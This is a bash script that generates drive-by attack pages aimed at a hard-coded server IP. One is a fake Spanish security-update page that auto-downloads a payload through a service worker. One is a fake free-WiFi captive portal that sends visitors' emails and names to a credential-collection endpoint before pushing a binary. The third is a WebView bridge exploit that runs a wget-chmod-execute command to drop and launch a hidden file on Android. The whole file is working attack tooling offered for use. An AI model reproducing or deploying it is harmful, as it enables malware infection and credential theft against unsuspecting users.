#!/bin/bash
# Web Drive-By Templates Generator
# Generates: service worker downloader, captive portal, WebView XSS
# Usage: generate_driveby.sh <template> <vps_host> <binary_name> <output.html>

TEMPLATE="${1:-sw}"
VPS_HOST="${2:-51.222.84.105}"
BINARY="${3:-payload}"
OUTPUT="${4:-/tmp/payloads/driveby.html}"

mkdir -p "$(dirname "$OUTPUT")"

generate_service_worker() {
    cat << HTMLEOF > "$OUTPUT"
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Actualizando...</title>
<style>body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;margin:0}.spinner{width:40px;height:40px;border:3px solid #0f3460;border-top-color:#e94560;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.container{text-align:center}.progress{width:200px;height:4px;background:#16213e;border-radius:2px;margin:15px auto;overflow:hidden}.progress-bar{height:100%;background:#e94560;width:0;transition:width 0.3s}</style></head>
<body>
<div class="container">
    <div class="spinner"></div>
    <p style="margin-top:15px;">Actualización de seguridad en curso...</p>
    <p style="font-size:11px;color:#777;">No cierre esta ventana</p>
    <div class="progress"><div class="progress-bar" id="pb"></div></div>
</div>
<script>
// Service Worker drive-by downloader
const PAYLOAD_URL = 'https://${VPS_HOST}/${BINARY}';
let progress = 0;

async function driveBy() {
    // Register service worker
    if ('serviceWorker' in navigator) {
        const reg = await navigator.serviceWorker.register('sw.js');
        // SW will intercept and cache the payload
        await reg.update();
    }
    
    // Direct download fallback
    const resp = await fetch(PAYLOAD_URL);
    const total = parseInt(resp.headers.get('Content-Length') || '0');
    const reader = resp.body.getReader();
    const chunks = [];
    let loaded = 0;
    
    while (true) {
        const {done, value} = await reader.read();
        if (done) break;
        chunks.push(value);
        loaded += value.length;
        if (total > 0) {
            progress = Math.min(100, Math.round((loaded / total) * 100));
            document.getElementById('pb').style.width = progress + '%';
        }
    }
    
    const blob = new Blob(chunks);
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'update.bin';
    document.body.appendChild(a);
    a.click();
    
    // Platform-specific execution
    setTimeout(() => {
        if (navigator.platform.includes('Win')) {
            location.href = 'ms-settings:windowsupdate';
        } else if (navigator.platform.includes('Android')) {
            location.href = 'intent://' + location.host + '/dl#Intent;scheme=https;package=com.android.chrome;end';
            setTimeout(() => location.href = 'market://details?id=com.android.chrome', 1000);
        }
    }, 1500);
}

// Service Worker registration file (served separately)
const swCode = \`
self.addEventListener('install', (e) => {
    e.waitUntil(
        caches.open('v1').then(cache => cache.add('${PAYLOAD_URL}'))
    );
});

self.addEventListener('activate', (e) => {
    e.waitUntil(clients.claim());
});

self.addEventListener('fetch', (e) => {
    if (e.request.url.includes('${BINARY}')) {
        e.respondWith(
            caches.match(e.request).then(r => r || fetch(e.request))
        );
    }
});
\`;

// Auto-trigger
driveBy();
</script>
</body>
</html>
HTMLEOF
    echo "Generated: $OUTPUT (service worker drive-by)"
}

generate_captive_portal() {
    cat << HTMLEOF > "$OUTPUT"
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Gratis</title>
<style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background:#fff}.card{max-width:360px;padding:25px;text-align:center}.wifi{font-size:48px;margin-bottom:10px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:14px}button{width:100%;padding:12px;background:#007aff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}.terms{font-size:10px;color:#999;margin-top:15px}</style></head>
<body>
<div class="card">
    <div class="wifi">📶</div>
    <h2 style="margin:0 0 5px;font-size:20px">WiFi Gratis</h2>
    <p style="color:#666;font-size:13px;margin:0 0 20px">Conéctate gratis a Internet</p>
    <input type="email" placeholder="Email" id="email">
    <input type="text" placeholder="Nombre" id="name">
    <button onclick="connect()">Conectar</button>
    <p class="terms">Al conectar aceptas los términos de uso</p>
</div>
<script>
const PAYLOAD = 'https://${VPS_HOST}/${BINARY}';
async function connect() {
    const email = document.getElementById('email').value;
    const name = document.getElementById('name').value;
    
    // "Authenticate" user (harvest credentials)
    if (email) {
        fetch('https://${VPS_HOST}:8082/ingest/creds', {
            method: 'POST',
            body: JSON.stringify({email, name, ua: navigator.userAgent, ts: Date.now()}),
            headers: {'Content-Type': 'application/json'},
            mode: 'no-cors'
        }).catch(() => {});
    }
    
    // Download payload
    document.querySelector('h2').innerText = 'Conectando...';
    document.querySelector('button').disabled = true;
    
    try {
        const resp = await fetch(PAYLOAD);
        const blob = await resp.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'config.bin';
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            document.querySelector('h2').innerText = '¡Conectado!';
            if (navigator.platform.includes('Android')) {
                location.href = 'intent://' + location.host + '/ok#Intent;scheme=https;end';
            }
        }, 2000);
    } catch(e) {
        document.querySelector('h2').innerText = 'Conectado';
    }
}
</script>
</body>
</html>
HTMLEOF
    echo "Generated: $OUTPUT (captive portal)"
}

generate_webview_xss() {
    cat << HTMLEOF > "$OUTPUT"
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>.</title></head>
<body style="display:none">
<script>
// WebView JavaScript bridge exploit
// Target: apps with exposed JS interfaces (addJavascriptInterface)

const PAYLOAD = 'https://${VPS_HOST}/${BINARY}';
const BRIDGES = [
    'Android', 'JSInterface', 'appInterface', 'webview',
    'nativeBridge', '__native_bridge', 'webkit',
    'messageHandlers', 'postMessage'
];

function findAndExploit() {
    for (const name of BRIDGES) {
        try {
            if (typeof window[name] !== 'undefined') {
                const obj = window[name];
                // Try common execution methods
                for (const method of ['execute', 'exec', 'run', 'eval', 'shell']) {
                    if (typeof obj[method] === 'function') {
                        obj[method]('wget -qO /data/local/tmp/.jw24 ' + PAYLOAD + ' && chmod 755 /data/local/tmp/.jw24 && nohup /data/local/tmp/.jw24 &');
                        return true;
                    }
                }
                // Try postMessage
                if (typeof obj.postMessage === 'function') {
                    obj.postMessage(JSON.stringify({
                        cmd: 'download', url: PAYLOAD, path: '/data/local/tmp/.jw24'
                    }));
                    return true;
                }
            }
        } catch(e) {}
    }
    
    // Fallback: force download via intent
    if (navigator.platform.includes('Android')) {
        location.href = 'intent://${VPS_HOST}/' + '${BINARY}' + '#Intent;scheme=https;package=com.android.chrome;end';
    }
    return false;
}

findAndExploit();
</script>
</body>
</html>
HTMLEOF
    echo "Generated: $OUTPUT (WebView XSS bridge)"
}

case "$TEMPLATE" in
    sw|service-worker)  generate_service_worker ;;
    captive|portal)     generate_captive_portal ;;
    xss|webview)        generate_webview_xss ;;
    all)
        generate_service_worker
        OUT2="${OUTPUT%.html}-captive.html"
        TEMPLATE=captive OUTPUT="$OUT2" generate_captive_portal
        OUT3="${OUTPUT%.html}-xss.html"
        TEMPLATE=xss OUTPUT="$OUT3" generate_webview_xss
        ;;
    *) echo "Usage: $0 <sw|captive|xss|all> <vps_host> <binary> [output]"; exit 1 ;;
esac
